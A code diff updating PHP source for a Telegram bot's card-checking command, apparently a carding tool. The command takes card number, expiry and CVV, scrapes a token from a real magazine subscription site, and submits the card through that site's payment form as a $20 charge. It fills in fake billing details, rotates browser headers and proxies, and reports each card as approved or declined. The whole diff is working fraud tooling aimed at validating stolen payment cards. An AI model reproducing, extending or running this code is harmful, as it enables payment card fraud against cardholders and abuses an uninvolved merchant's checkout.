@@ -3893,37 +3893,28 @@ ob_flush();
 ////https://panoramitalia.com/index.php/subscribe/
 elseif((strpos($message, "!pa") === 0)||(strpos($message, "/pa") === 0)||(strpos($message, ".pa") === 0)){
 
-
-
 $lista = substr($message, 4);
 $i = preg_split('/[|:| ]/', $lista);
-	//$i     = explode("|", $lista);
 $cc    = $i[0];
 $mes   = $i[1];
-$ano  = $i[2];
-$cvv   = $i[3];
-
+$ano   = $i[2];
+$cvv   = $i[3];                                            
 $bin = substr($lista, 0, 6);
 
-
-////
-$num = "$cc$mes$ano$cvv";
-//-----------------------------------------------------//
 $verify = substr($cc, 16, 1);
 if($verify != ""){
-$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
-sendMessage($chat_id,$respuesta, $message_id);
-die();
+        $respuesta = "🚫 Oops!\nUse this format: /pa CC|MM|YYYY|CVV\n";
+        sendMessage($chat_id,$respuesta, $message_id);
+        die();
 }
 
 if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
+
 }else{
-$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /pa cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !pa cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .pa cc|m|y|cvv\n";
-sendMessage($chat_id,$respuesta, $message_id);
-die();
+        $respuesta = "🚫 Oops!\nUse this format: /pa CC|MM|YYYY|CVV\n";
+        sendMessage($chat_id,$respuesta, $message_id);
+        die();
 }
-
-
 //----------------MENSAGE DE ESPERA-------------------//
 $respuesta = "<b>🕒 Wait for Result...</b>";
 sendMessage($chat_id,$respuesta, $message_id);
@@ -3946,7 +3937,11 @@ $brand = $binna['scheme'];
 if (empty($brand)) {
 $brand = "Unavailable";
 }
+//VARIABLES//
 $MV = ucwords(strtolower(trim($brand)));
+$cc = chunk_split($cc, 4, ' ');
+$fecha = date('Y/m/d');
+
 
 
 $curl = curl_init();
@@ -3960,28 +3955,32 @@ curl_setopt_array($curl, [
   CURLOPT_CUSTOMREQUEST => 'GET',
   CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fpanoramitalia.com%2F%3Fwc-ajax%3Dget_refreshed_fragments',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
-    'Accept-Encoding: gzip, deflate, br, zstd',
-    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
     'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
     'Upgrade-Insecure-Requests: 1',
-    'Accept-Language: es-US,es;q=0.6',
+    'Sec-GPC: 1',
+    'Accept-Language: es-US,es;q=0.5',
+    'Sec-Fetch-Site: same-origin',
+    'Sec-Fetch-Mode: navigate',
+    'Sec-Fetch-User: ?1',
+    'Sec-Fetch-Dest: document',
     'Referer: https://panoramitalia.com/',
   ],
 ]);
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
-curl_close($curl);
-
 $patron = '/name="_cf_verify" value="([^"]+)"/';
 preg_match($patron, $response, $coincidencias);
 $token = $coincidencias[1];
+curl_close($curl);
 
 
 
 $curl = curl_init();
+
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://panoramitalia.com/cf-api/CF6317ae143565f',
   CURLOPT_RETURNTRANSFER => true,
@@ -3997,7 +3996,7 @@ curl_setopt_array($curl, [
     '_cf_frm_ct' => '1',
     'cfajax' => 'CF6317ae143565f',
     '_cf_cr_pst' => '335',
-    'twitter' => '',
+    'email' => '',
     'fld_1604923' => 'Canada',
     'fld_3782878' => '1 year ($20) - 4 issues',
     'fld_6223773' => 'First time subscription',
@@ -4010,17 +4009,19 @@ curl_setopt_array($curl, [
     'fld_950613' => ''.$nombre.'',
     'fld_2278346' => ''.$apellido.'',
     'fld_6787259' => ''.$telefono.'',
-    'fld_2041995' => 'Canada',
-    'fld_5232305' => ''.$direccion1.'',
-    'fld_4491871' => ''.$direccion1.'',
-    'fld_3911000' => ''.$ciudad.'',
-    'fld_2494407' => ''.$zip.'',
+    'fld_2041995' => 'United States',
+    'fld_5232305' => '6195 bollinger rd',
+    'fld_4491871' => '',
+    'fld_3911000' => 'New york',
+    'fld_2494407' => '10010',
     'fld_778305' => 'AZ',
     'fld_4577367' => '20.00',
     'fld_3144093' => 'click',
     'fld_5757786' => ''.$fecha.'',
-    'fld_2545505' => '101204525',
+    'fld_2545505' => '101205650',
     'fld_6974264' => '100',
+    'alt_s' => '',
+    'gxlkmf1070' => '236533',
     'instance' => '1',
     'request' => 'https://panoramitalia.com/cf-api/CF6317ae143565f',
     'formId' => 'CF6317ae143565f',
@@ -4035,11 +4036,15 @@ curl_setopt_array($curl, [
   ],
   CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fpanoramitalia.com%2F%3Fwc-ajax%3Dget_refreshed_fragments',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua-platform: "Android"',
+    'X-Requested-With: XMLHttpRequest',
+    'Accept-Language: es-US,es;q=0.5',
     'Origin: https://panoramitalia.com',
     'Referer: https://panoramitalia.com/index.php/subscribe/',
   ],
 ]);
+
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
@@ -4073,13 +4078,13 @@ if (empty($respo)) {
 
 // Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
 if (array_in_string($respo, $live_array)) {
-    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($20)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 20$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: APPROVED ✅\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
     $live = True;
 } elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Transaction refused due to risk model.') !== false) {
-    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($20)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 20$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: DECLINED ❌\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
     $live = False;
 } else {
-    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($20)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 20$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: GATE ERROR ❌\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
     $live = False;
 }
 
